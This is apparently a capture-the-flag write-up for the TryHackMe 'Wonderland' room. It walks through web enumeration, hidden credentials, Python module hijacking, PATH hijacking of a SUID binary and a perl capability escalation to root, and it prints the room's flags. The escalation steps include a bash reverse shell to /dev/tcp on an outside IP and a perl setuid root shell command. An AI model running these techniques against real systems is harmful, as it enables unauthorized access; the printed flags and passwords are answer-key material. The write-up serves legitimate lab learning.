# Wonderland

# Solution

The usual start
```bash
cmd: sudo nmap 10.10.155.137

No ports open
```

Hummm, even a stealth scan returns 0 ports... This means that either:
- Higher ports open
- UDP ports

While the scans are performing, i'll just try check if there is a webserver... And it is! :) <br>

The page only has an image and a sentence from "Alice in the wonderwold" movie. <br>

Downloading the image and checking for hidden stuff in it we get something:

```bash
cmd: steghide extract -sf white_rabbit_1.jpg
Enter passphrase: # empty
wrote extracted data to "hint.txt".

cmd: cat hint.txt
follow the r a b b i t 
```

Well, i don't really know how that's a hint, but alright... lets poke around a bit more <br>

Since this image had something hidden within it, lets check if there's more images at 
```sql
-- http://10.10.155.137/img/
alice_door.jpg
alice_door.png
white_rabbit_1.jpg
```

Both alice pictures have the same drawing but the background color is different (png - yellow, jpg - white). By running exiftool in both, we see that the **.jpg** has some interesting stuff (snippet only)
```
Slices Group Name               : De_Alice's_Abenteuer_im_Wunderland_Carroll_pic_03
Creator Tool                    : Adobe Photoshop CS3 Macintosh
Thumbnail Image                 : (Binary data 12311 bytes, use -b option to extract)
```

Extracting the thumbnail image did not provided any further help... <br>

Since the box was extremely slow, and fuzzing it was becoming impossible, i restarted it and well, nice surprise, now nmap and ffuf works lul. <br>

Nmap:
- 22 ssh 
- 80 http

Fuzzing this server is taking AGES because at a given point it blocks requests, and then come back after a period stuck.

```
cmd: ffuf -recursion -u http://10.10.244.192/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt

img                     [Status: 301, Size: 0, Words: 1, Lines: 1]
[INFO] Adding a new job to the queue: http://10.10.244.192/img/FUZZ
poem                    [Status: 301, Size: 0, Words: 1, Lines: 1]
[INFO] Adding a new job to the queue: http://10.10.244.192/poem/FUZZ
r                       [Status: 301, Size: 0, Words: 1, Lines: 1]
[INFO] Adding a new job to the queue: http://10.10.244.192/r/FUZZ
[INFO] Starting queued job on target: http://10.10.244.192/img/FUZZ
[INFO] Starting queued job on target: http://10.10.244.192/poem/FUZZ
[INFO] Starting queued job on target: http://10.10.244.192/r/FUZZ
a                       [Status: 301, Size: 0, Words: 1, Lines: 1]
[INFO] Adding a new job to the queue: http://10.10.244.192/r/a/FUZZ
[INFO] Starting queued job on target: http://10.10.244.192/r/a/FUZZ
b                       [Status: 301, Size: 0, Words: 1, Lines: 1]
[INFO] Adding a new job to the queue: http://10.10.244.192/r/a/b/FUZZ
```

Well, we can already see where it is going: http://10.10.244.192/r/a/b/FUZZ -> /r/a/b/b/i/t <br>

The hint was right, we just found it in the wrong order :D <br>

Checking the page, there's a bit of text and an image. The image is one of those images found earlier (now is the png), with the following source code
```html
<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"
    </p>
    <p>"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving
        the other paw, "lives a March Hare. Visit either you like: they’re both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
</body>
``` 

Welll, we can see those creds (```alice:HowDothTheLittleCrocodileImproveHisShiningTail```) and they work for SSH eheh :D 
```bash
# cmd: whoami && id
alice
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

This stupid machine is always freezing, fml... 5 minutes each time or so <br>

From /etc/passwd we can see the users available
```r
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:tryhackme:/home/tryhackme:/bin/bash
alice:x:1001:1001:Alice Liddell,,,:/home/alice:/bin/bash
hatter:x:1003:1003:Mad Hatter,,,:/home/hatter:/bin/bash
rabbit:x:1002:1002:White Rabbit,,,:/home/rabbit:/bin/bash
```

The webserver is being ran by the tryhacme room from its home folder (saw with cmd: ps aux) <br>

Since i was not finding anything in the system, i just did **sudo -l** and well, if i was not dumb, i had lost less time
```bash
# cmd: sudo -l

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The script selects random strings from a giant multiline string. It also does "**import random**" at the top, so we might be able to create a module named **random** and execute code as rabbit <br>

So by doing something simillar as the code show below, we can execute commands on **rabbit's** behalf
```py
# filename: random.py
# command to execute: sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
import os
os.system("chmod 777 /home/rabbit/");
```

This way we can go to his folder and check what is there... the ideal would be a reverse shell but this is always freezing thus a reverse shell will crash too <br>

Within is folder, rabbit has a binary (**teaParty**), owned by root and configured with the SUID bit set, lets pull it to the local machine to analyze it <br>

checking its compiling hardening techniques
```sql
# cmd: checksec --file=teaParty
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Checking the binary in ghidra, this is the main function
```c
void main(void)
{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}
```

Well, looks like we have yet another relative reference in the system function call. Lets poke that around to check if it will work ! <br>

First i created an executable shellscript named date (in the rabbit's home folder, besides the binary)
```bash
# file: date
# perms: +x
# contents below
# ------------------ # 
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.9.128.84/1414 0>&1
```

Now i executed the binary and it did not worked. First i thought that maybe i would need to explore a library injection but then i checked the **PATH** env variable and it was not searching **/home/rabbit** for the date program

```bash
cmd [SSH]: export PATH=/home/rabbit:$PATH
cmd [SSH]: ./teaPArty

cmd [LOCAL]: whoami && id
hatter
uid=1003(hatter) gid=1001(alice) groups=1001(alice)
```

well, from the main function code we saw that it calls **setuid** and **setgid**, which is seen here (the previleges are dropped) <br>

At **Hatter's** home folder we only have one file
```bash
# cmd: ls -la /home/hatter
-rw------- 1 hatter hatter   29 May 25  2020 password.txt

# cmd: cat /home/hatter/password.txt
WhyIsARavenLikeAWritingDesk? 
```

This password, works for ssh :D <br>

I looked around for a bit (way longer than i really wanted), but ended up running linpeas and finding some interesting things :D
```s
/usr/bin/perl5.26.1 = cap_setuid+ep                                                                              
/usr/bin/mtr-packet = cap_net_raw+ep                                                                             
/usr/bin/perl = cap_setuid+ep
```

So, this capabities basically allow perl to set the suid bit and thus it allows for privilege escalation. directly from GTFO bins
```bash 
cmd: ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

cmd: whoami && id 
root
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

Well, now we need the TWO flags... wth, never seen this type of box xD <br>
```bash
cmd: cat /root/root.txt 
# No such file or directory ... wth!?!?!
cmd: ls -la /root/
# -rw-r--r--  1 root root   32 May 25  2020 user.txt # really=?!?! -.-
cmd: cat /root/user.txt
#thm{"Curiouser and curiouser!"}

cmd: cat /home/alice/root.txt
# thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

## User Flag: thm{"Curiouser and curiouser!"}
## Root Flag: thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}

This box was so much FUNNNN!!!! loved it <br>

The only thing i did not like was the machine freezing but i think that was on me since the last portion (from rabbit to hatter) worked well without those incidents <br>